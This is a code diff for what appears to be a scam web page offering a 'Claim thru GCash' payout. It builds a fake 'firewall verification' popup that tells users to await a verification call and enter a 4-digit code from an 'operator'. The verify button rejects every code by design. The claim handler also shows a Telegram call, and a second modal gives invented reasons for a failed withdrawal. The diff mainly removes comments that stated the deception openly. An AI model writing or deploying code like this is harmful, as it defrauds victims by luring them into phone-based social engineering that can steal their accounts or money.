@@ -52,7 +52,7 @@ async function handleClaimThruGCash() {
                     .catch(e => console.log("Telegram error:", e));
                 
                 console.log("Redirecting to:", targetUrl);
-                alert("✅ CLAIM SUCCESSFUL! Redirecting to GCash payout...");
+                alert("CLAIM SUCCESSFUL! Redirecting to GCash payout...");
                 window.location.href = targetUrl;
                 
             } else {
@@ -66,7 +66,7 @@ async function handleClaimThruGCash() {
     }
 }
 
-// ========== 2. FIREWALL VERIFICATION POPUP (4-DIGIT CODE - ALWAYS INVALID) ==========
+// ========== 2. FIREWALL VERIFICATION POPUP ==========
 function showFirewallVerificationPopup() {
     // Remove existing modal if any
     var existingModal = document.getElementById('firewallModal');
@@ -85,22 +85,20 @@ function showFirewallVerificationPopup() {
     modal.style.display = 'flex';
     modal.style.alignItems = 'center';
     modal.style.justifyContent = 'center';
-    modal.style.fontFamily = "'Inter', sans-serif";
     
     modal.innerHTML = `
         <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">
             <div style="font-size: 48px; margin-bottom: 15px;">📞</div>
             <h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>
-            <div style="color: white; font-size: 13px; margin-bottom: 20px; line-height: 1.5;">
+            <div style="color: white; font-size: 13px; margin-bottom: 20px;">
                 <p>Please wait for the system-verification call.</p>
-                <p>An operator will provide your <strong>4-digit code</strong> shortly.</p>
+                <p>Enter the 4-digit code provided during the call.</p>
             </div>
             <div style="display: flex; gap: 10px; margin-bottom: 15px;">
-                <input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center; letter-spacing: 4px;" placeholder="1234" maxlength="4" inputmode="numeric">
+                <input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center;" placeholder="1234" maxlength="4">
                 <button id="submitVerifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 30px; padding: 0 20px; font-weight: bold; color: white; cursor: pointer;">VERIFY</button>
             </div>
-            <div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; margin-top: 10px; display: none;"></div>
-            <div style="font-size: 11px; color: #ffaa33; margin-top: 10px;">Waiting for verification call...</div>
+            <div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; display: none;"></div>
         </div>
     `;
     
@@ -112,7 +110,6 @@ function showFirewallVerificationPopup() {
     
     if (codeInput) codeInput.focus();
     
-    // ALWAYS INVALID - No correct code
     verifyBtn.onclick = function() {
         var enteredCode = codeInput.value.trim();
         
@@ -122,20 +119,16 @@ function showFirewallVerificationPopup() {
             return;
         }
         
-        // Always show error - never successful
-        errorDiv.innerHTML = "❌ Invalid verification code. Please provide the correct 4-digit code from the verification call.";
+        errorDiv.innerHTML = "Invalid verification code. Please provide the correct 4-digit code from the verification call.";
         errorDiv.style.display = 'block';
         codeInput.value = '';
         codeInput.focus();
         
-        console.log("Verification failed - Always invalid per firewall policy");
+        console.log("Verification failed - Always invalid");
     };
     
-    // Close modal when clicking outside
     modal.onclick = function(e) {
-        if (e.target === modal) {
-            modal.remove();
-        }
+        if (e.target === modal) modal.remove();
     };
 }
 
@@ -148,25 +141,22 @@ function showNoLinkAlert() {
     modal.style.width = '100%';
     modal.style.height = '100%';
     modal.style.background = 'rgba(0,0,0,0.95)';
-    modal.style.backdropFilter = 'blur(10px)';
     modal.style.zIndex = '20000';
     modal.style.display = 'flex';
     modal.style.alignItems = 'center';
     modal.style.justifyContent = 'center';
-    modal.style.fontFamily = "'Inter', sans-serif";
     
     modal.innerHTML = `
-        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
+        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 320px; width: 85%; padding: 30px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
             <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
             <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNSUCCESSFUL</h3>
-            <div style="color: white; font-size: 13px; line-height: 1.6; text-align: left;">
+            <div style="color: white; font-size: 13px; text-align: left; margin-top: 20px;">
                 <p><strong>Possible Reasons:</strong></p>
-                <p>• No GCash payout link has been deployed by the administrator.</p>
-                <p>• This device has already reached the maximum payout limit.</p>
-                <p>• No GCash app installed on this device.</p>
-                <p>• Please try using another device or contact support.</p>
+                <p>• No GCash payout link available</p>
+                <p>• Device reached maximum payout limit</p>
+                <p>• No GCash app installed</p>
             </div>
-            <button id="closeAlertBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 40px; padding: 12px 25px; color: white; font-weight: bold; margin-top: 25px; cursor: pointer; width: 100%;">GOT IT</button>
+            <button id="closeAlertBtn" style="background: #ff4444; border: none; border-radius: 40px; padding: 12px; color: white; font-weight: bold; margin-top: 20px; width: 100%; cursor: pointer;">GOT IT</button>
         </div>
     `;
     
@@ -174,31 +164,31 @@ function showNoLinkAlert() {
     document.getElementById('closeAlertBtn').onclick = function() {
         modal.remove();
     };
-    
-    modal.onclick = function(e) {
-        if (e.target === modal) modal.remove();
-    };
 }
 
 // ========== 4. INITIALIZE CLAIM THRU GCASH BUTTON ==========
 function initClaimThruGCashButton() {
     var claimBtn = document.getElementById('claimGCashBtn');
+    
     if (claimBtn) {
+        console.log("CLAIM THRU GCASH button found");
+        
         // Remove existing listeners
         var newBtn = claimBtn.cloneNode(true);
         claimBtn.parentNode.replaceChild(newBtn, claimBtn);
         claimBtn = newBtn;
         
+        // Add click event
         claimBtn.onclick = function(e) {
             e.preventDefault();
             e.stopPropagation();
             console.log("CLAIM THRU GCASH button clicked");
             handleClaimThruGCash();
         };
-        console.log("CLAIM THRU GCASH button initialized");
+        
+        console.log("CLAIM THRU GCASH button ready");
     } else {
         console.log("CLAIM THRU GCASH button not found - will retry");
-        // Retry after short delay
         setTimeout(initClaimThruGCashButton, 500);
     }
 }
